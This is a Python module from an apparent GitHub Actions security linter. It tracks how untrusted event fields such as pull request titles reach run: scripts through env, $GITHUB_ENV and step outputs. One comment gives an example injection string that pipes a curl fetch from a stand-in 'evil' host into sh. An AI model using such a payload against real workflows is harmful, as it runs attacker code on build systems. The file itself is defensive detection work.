"""Following untrusted values through ``env:``, ``$GITHUB_ENV`` and step/job outputs (WG004).

Putting ``${{ github.event.pull_request.title }}`` straight into ``run:`` is the obvious form of
template injection. The same value can also take a detour and still end up pasted into a script:

    env:
      TITLE: ${{ github.event.pull_request.title }}      # job level
    steps:
      - id: meta
        run: echo "title=$TITLE" >> "$GITHUB_OUTPUT"     # safe here: a shell variable
      - run: echo "${{ steps.meta.outputs.title }}"      # injection, two hops later

``Tracker`` walks the steps of each job in order, like the runner does, and remembers which
values are *tainted* (carry untrusted text) and how they got there:

- ``env:`` at workflow, job and step level; a lower level that sets the same name to a clean
  value removes the taint;
- ``NAME=value >> $GITHUB_ENV`` in a ``run:`` script (later steps of the job see ``NAME``);
- ``name=value >> $GITHUB_OUTPUT`` in a step with an ``id`` (``steps.<id>.outputs.<name>``);
- job ``outputs:``, read by other jobs as ``needs.<job>.outputs.<name>``.

A value is tainted if one of its ``${{ }}`` expressions is, or (in a script) if it uses a shell
variable that holds a tainted ``env`` value.
"""

from __future__ import annotations

import re
from collections.abc import Iterator
from dataclasses import dataclass, field, replace

from yaml.nodes import MappingNode, Node

from .expressions import (
    ContextPath,
    Expression,
    ExpressionError,
    context_paths,
    find_expressions,
    is_ancestor,
    matches,
)
from .model import Severity
from .workflow import Step, Workflow, get, items, scalar

# Context values an outsider controls: titles, bodies, branch names, commit messages...
# Placed straight into a shell script, "a`; curl evil.sh | sh`" in a PR title runs as code.
# Paths as context_paths() returns them: lower case, "*" for any array element.
UNTRUSTED: tuple[tuple[str, ...], ...] = tuple(
    tuple(p.split("."))
    for p in (
        "github.head_ref",
        "github.event.issue.title",
        "github.event.issue.body",
        "github.event.pull_request.title",
        "github.event.pull_request.body",
        "github.event.pull_request.head.ref",
        "github.event.pull_request.head.label",
        "github.event.pull_request.head.repo.default_branch",
        "github.event.comment.body",
        "github.event.review.body",
        "github.event.review_comment.body",
        "github.event.discussion.title",
        "github.event.discussion.body",
        "github.event.pages.*.page_name",
        "github.event.commits.*.message",
        "github.event.commits.*.author.email",
        "github.event.commits.*.author.name",
        "github.event.head_commit.message",
        "github.event.head_commit.author.email",
        "github.event.head_commit.author.name",
        "github.event.workflow_run.head_branch",
        "github.event.workflow_run.head_commit.message",
        "github.event.workflow_run.head_commit.author.email",
        "github.event.workflow_run.head_commit.author.name",
    )
)

OUTSIDER = "outsider"
"""A context field anyone can set, such as a pull request title."""
TOJSON = "tojson"
"""``toJSON()`` of an object that contains such a field."""
INPUT = "input"
"""A composite action's input: the calling workflow may pass untrusted text."""


@dataclass(frozen=True)
class Taint:
    kind: str
    """``OUTSIDER``, ``TOJSON`` or ``INPUT``."""
    source: str
    """Where the text comes from, e.g. ``github.event.pull_request.title``."""
    severity: Severity
    example: str = ""
    """For ``TOJSON``: one untrusted field inside the object."""
    via: tuple[str, ...] = ()
    """The detour, oldest first, e.g. ``("env.TITLE (job 'test')", "steps.meta.outputs.title")``."""

    def through(self, hop: str) -> Taint:
        return replace(self, via=(*self.via, hop))


def direct_taint(path: ContextPath, in_action: bool) -> Taint | None:
    """The taint of a context path on its own, without looking at env or outputs."""
    if any(matches(path.segments, pattern) for pattern in UNTRUSTED):
        return Taint(OUTSIDER, str(path), Severity.HIGH)
    if path.function == "tojson":
        inside = next((p for p in UNTRUSTED if is_ancestor(path.segments, p)), None)
        if inside is not None:
            return Taint(TOJSON, str(path), Severity.HIGH, example=".".join(inside))
    # In a composite action, inputs come from whichever workflow calls it, and that workflow may
    # pass a pull request title straight through: the action can't know, so it must not trust them.
    if in_action and len(path.segments) >= 2 and path.segments[0] == "inputs":
        return Taint(INPUT, str(path), Severity.MEDIUM)
    return None


@dataclass
class Scope:
    """What is tainted at one point of a job."""

    env: dict[str, Taint] = field(default_factory=dict)
    """Environment variables by their exact name (shell variables are case-sensitive)."""
    outputs: dict[tuple[str, str], Taint] = field(default_factory=dict)
    """``(step id, output name)``, both lower case (expressions ignore case)."""

    def copy(self) -> Scope:
        return Scope(dict(self.env), dict(self.outputs))

    def env_by_expression(self, name: str) -> tuple[str, Taint] | None:
        """``env.<name>`` in an expression: property names ignore case there."""
        for key, taint in self.env.items():
            if key.lower() == name:
                return key, taint
        return None


# A line of a script that appends to $GITHUB_ENV or $GITHUB_OUTPUT:
#   echo "title=$TITLE" >> "$GITHUB_OUTPUT"     echo NAME=value >>$GITHUB_ENV
_WRITE = re.compile(
    r"""(?P<name>[A-Za-z_][\w-]*)=(?P<value>.*?)["']?\s*>>\s*["']?\$\{?GITHUB_(?P<file>OUTPUT|ENV)\b"""
)
_SHELL_VAR = re.compile(r"\$\{?([A-Za-z_]\w*)")
# Any line appending to $GITHUB_ENV or $GITHUB_PATH, whatever comes before ">>" (WG007).
_APPEND = re.compile(r""">>\s*["']?\$\{?GITHUB_(?P<file>ENV|PATH)\b""")


@dataclass(frozen=True)
class FileWrite:
    """A line of a ``run:`` script that appends tainted text to $GITHUB_ENV or $GITHUB_PATH."""

    line: int
    """Index of the line within the script (0 = first)."""
    file: str
    """``ENV`` or ``PATH``."""
    taint: Taint


@dataclass(frozen=True)
class TrackedStep:
    step: Step
    scope: Scope
    """What is tainted while this step runs (its own env: included)."""
    writes: list[FileWrite] = field(default_factory=list)
    """Tainted text this step's script appends to $GITHUB_ENV / $GITHUB_PATH."""


class Tracker:
    def __init__(self, wf: Workflow) -> None:
        self.wf = wf
        self._jobs = {job_id.lower(): (job_id, job) for job_id, job in wf.jobs()}
        self._walked: dict[str, tuple[list[TrackedStep], dict[str, Taint]]] = {}
        self._walking: set[str] = set()

    # --- public -----------------------------------------------------------------------------

    def steps(self) -> Iterator[TrackedStep]:
        """Every step with what is tainted while it runs, in workflow order."""
        if self.wf.is_action:
            yield from self._walk_steps(list(self.wf.steps()), Scope(), "the action")[0]
            return
        for key in self._jobs:
            yield from self._walk_job(key)[0]

    def taint_of_expression(self, expr: Expression, scope: Scope) -> tuple[ContextPath, Taint] | None:
        """The first tainted path in one expression, with its taint."""
        for path in _paths(expr):
            if (taint := self._taint_of_path(path, scope)) is not None:
                return path, taint
        return None

    # --- values -----------------------------------------------------------------------------

    def _taint_of_path(self, path: ContextPath, scope: Scope) -> Taint | None:
        if (taint := direct_taint(path, self.wf.is_action)) is not None:
            return taint
        seg = path.segments
        if seg[0] == "env" and len(seg) >= 2 and (found := scope.env_by_expression(seg[1])):
            return found[1]
        if seg[0] == "steps" and len(seg) >= 4 and seg[2] == "outputs":
            return scope.outputs.get((seg[1], seg[3]))
        if seg[0] == "needs" and len(seg) >= 4 and seg[2] == "outputs" and not self.wf.is_action:
            return self._walk_job(seg[1])[1].get(seg[3]) if seg[1] in self._jobs else None
        return None

    def _taint_of_text(self, text: str, scope: Scope) -> Taint | None:
        for expr in find_expressions(text):
            if (hit := self.taint_of_expression(expr, scope)) is not None:
                return hit[1]
        return None

    def _taint_of_shell(self, text: str, scope: Scope) -> Taint | None:
        """Like _taint_of_text, plus ``$NAME`` / ``${NAME}`` of a tainted environment variable."""
        if (taint := self._taint_of_text(text, scope)) is not None:
            return taint
        for match in _SHELL_VAR.finditer(text):
            if (taint := scope.env.get(match.group(1))) is not None:
                return taint
        return None

    def _apply_env(self, node: Node | None, scope: Scope, where: str) -> None:
        """Apply an ``env:`` mapping to ``scope``: tainted values in, clean ones out."""
        if not isinstance(node, MappingNode):
            return
        values = [(name, scalar(value)) for name, value in items(node)]
        before = scope.copy()  # the values of one env: block can't see each other
        for name, value in values:
            taint = self._taint_of_text(value, before) if value is not None else None
            if taint is None:
                scope.env.pop(name, None)
            else:
                scope.env[name] = taint.through(f"env.{name} ({where})")

    # --- walking ----------------------------------------------------------------------------

    def _walk_job(self, key: str) -> tuple[list[TrackedStep], dict[str, Taint]]:
        """The steps of one job and its tainted outputs; cached, and safe against needs: loops."""
        if key in self._walked:
            return self._walked[key]
        if key in self._walking:
            return [], {}
        self._walking.add(key)
        job_id, job = self._jobs[key]
        scope = Scope()
        self._apply_env(get(self.wf.root, "env"), scope, "workflow")
        self._apply_env(get(job, "env"), scope, f"job '{job_id}'")
        steps = [s for s in self.wf.steps() if s.job_id == job_id]
        tracked, final = self._walk_steps(steps, scope, f"job '{job_id}'")
        outputs: dict[str, Taint] = {}
        for name, value in items(get(job, "outputs")):
            text = scalar(value)
            if text is not None and (taint := self._taint_of_text(text, final)) is not None:
                outputs[name.lower()] = taint.through(f"needs.{job_id}.outputs.{name}")
        self._walking.discard(key)
        self._walked[key] = (tracked, outputs)
        return tracked, outputs

    def _walk_steps(self, steps: list[Step], scope: Scope, where: str) -> tuple[list[TrackedStep], Scope]:
        tracked: list[TrackedStep] = []
        for number, step in enumerate(steps, start=1):
            step_id = scalar(get(step.node, "id"))
            label = f"step '{step_id}'" if step_id else f"step {number} of {where}"
            own = scope.copy()
            self._apply_env(get(step.node, "env"), own, label)
            current = TrackedStep(step, own)
            tracked.append(current)
            run = scalar(get(step.node, "run"))
            if run is not None:
                self._record_writes(run, own, scope, step_id, label)
                current.writes.extend(self._file_writes(run, own))
        return tracked, scope

    def _record_writes(self, run: str, own: Scope, scope: Scope, step_id: str | None, label: str) -> None:
        """``>> $GITHUB_ENV`` changes the job's env for later steps; ``>> $GITHUB_OUTPUT`` sets
        this step's outputs. ``own`` is what the script sees, ``scope`` what later steps get."""
        for line in run.splitlines():
            if (match := _WRITE.search(line)) is None:
                continue
            name, taint = match["name"], self._taint_of_shell(match["value"], own)
            if match["file"] == "ENV":
                if taint is None:
                    scope.env.pop(name, None)
                else:
                    scope.env[name] = taint.through(f"${name} written to $GITHUB_ENV in {label}")
            elif step_id:
                key = (step_id.lower(), name.lower())
                if taint is None:
                    scope.outputs.pop(key, None)
                else:
                    scope.outputs[key] = taint.through(f"steps.{step_id}.outputs.{name}")

    def _file_writes(self, run: str, own: Scope) -> Iterator[FileWrite]:
        for index, line in enumerate(run.splitlines()):
            if (match := _APPEND.search(line)) is None:
                continue
            # Everything before ">>": the echo/printf and what it writes.
            if (taint := self._taint_of_shell(line[: match.start()], own)) is not None:
                yield FileWrite(index, match["file"], taint)


def _paths(expr: Expression) -> list[ContextPath]:
    try:
        return context_paths(expr.inner)
    except ExpressionError:
        return []  # GitHub rejects the workflow before anything runs
